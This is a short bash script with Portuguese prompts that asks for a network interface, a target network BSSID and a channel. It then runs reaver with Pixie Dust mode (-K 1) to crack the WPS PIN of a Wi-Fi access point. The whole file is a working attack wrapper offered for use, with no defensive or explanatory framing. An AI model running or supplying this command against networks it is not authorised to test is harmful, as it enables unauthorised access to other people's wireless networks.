#!/bin/bash
# procura pin

echo Procura PIN da rede
echo -n "Qual a interface de rede :"
read interface
echo -n "Qual a rede :"
read rede
echo -n "Qual o canal :"
read canal
echo Executanto script

reaver -i $interface -b $rede -c $canal -vv -f -K 1
